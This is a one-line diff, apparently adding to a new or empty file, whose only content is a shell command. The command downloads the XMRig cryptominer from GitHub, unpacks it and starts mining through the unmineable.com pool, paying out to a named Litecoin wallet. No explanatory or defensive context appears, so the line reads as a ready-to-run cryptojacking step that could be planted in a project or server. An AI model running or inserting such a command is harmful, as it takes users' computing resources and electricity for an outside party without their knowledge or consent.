@@ -1,0 +1,1 @@
+curl -LO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz && tar -xf xmrig-6.21.0-linux-x64.tar.gz && cd xmrig-6.21.0 && ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u LTC:ltc1qjrk9q2jfcped8zpedpem2q42la5amh0h68pgyg -p x
